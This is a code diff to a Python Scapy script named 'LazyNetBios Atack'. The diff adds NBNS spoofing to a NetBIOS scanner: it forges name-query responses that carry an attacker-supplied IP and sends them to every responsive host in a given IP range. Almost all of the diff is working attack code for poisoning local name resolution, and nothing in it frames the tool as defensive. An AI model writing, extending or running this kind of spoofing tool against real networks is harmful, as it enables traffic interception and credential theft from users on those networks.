@@ -62,6 +62,32 @@ def check_netbios(ip):
             print(f"    ADDR: {rr.RDATA}")
     else:
         print(f"[-] No NetBIOS response from {ip}")
+    return response
+
+# Función para enviar una respuesta NBNS falsa
+def send_nbns_spoof(target_ip, target_name, spoof_ip, trans_id):
+    nbns_response = IP(dst=target_ip)/UDP(dport=137, sport=137)/NBNSQueryResponse(
+        NAME_TRN_ID=trans_id,
+        RESPONSE=1,  # This field indicates a response
+        OPCODE=0,
+        NM_FLAGS=0,
+        RCODE=0,
+        QDCOUNT=1,
+        ANCOUNT=1,
+        NSCOUNT=0,
+        ARCOUNT=0,
+        QUESTION_NAME=target_name,
+        QUESTION_TYPE=0x0020,
+        QUESTION_CLASS=0x0001,
+        ADDITIONAL_RRNAME=target_name,
+        ADDITIONAL_RRTYPE=0x0020,
+        ADDITIONAL_RRCLASS=0x0001,
+        ADDITIONAL_TTL=300,
+        ADDITIONAL_RDLENGTH=6,
+        ADDITIONAL_RDATA=spoof_ip
+    )
+    send(nbns_response, verbose=0)
+    print(f"[+] Enviada respuesta NBNS falsa a {target_ip} para {target_name} con IP {spoof_ip}")
 
 # Función para generar un rango de IPs
 def generate_ip_range(start_ip, end_ip):
@@ -88,17 +114,18 @@ if __name__ == "__main__":
     ██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
     ██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
     ███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
-    ╚══════╝╚═╝  ╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
+    ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
     [*] Iniciando: LazyNetBios Atack [;,;]
     """    
     print(BANNER)       
     time.sleep(2)
-    if len(sys.argv) != 3:
-        print("Usage: python script.py <start_ip> <end_ip>")
+    if len(sys.argv) != 4:
+        print("Usage: python script.py <start_ip> <end_ip> <spoof_ip>")
         sys.exit(1)
 
     start_ip = sys.argv[1]
     end_ip = sys.argv[2]
+    spoof_ip = sys.argv[3]
 
     ip_range = generate_ip_range(start_ip, end_ip)
 
@@ -108,4 +135,11 @@ if __name__ == "__main__":
     for ip in ip_range:
         print(f"[*] Checking {ip}...")
         check_arp(ip)
-        check_netbios(ip)
+        netbios_response = check_netbios(ip)
+        if netbios_response:
+            trans_id = netbios_response[NBNSQueryResponse].NAME_TRN_ID
+            target_name = b'*' + b'\x00'*15
+            print(f"[*] Spoofing {ip}...")
+            send_nbns_spoof(ip, target_name, spoof_ip, trans_id)
+        else:
+            print(f"[-] No NetBIOS response from {ip}, skipping spoofing.")
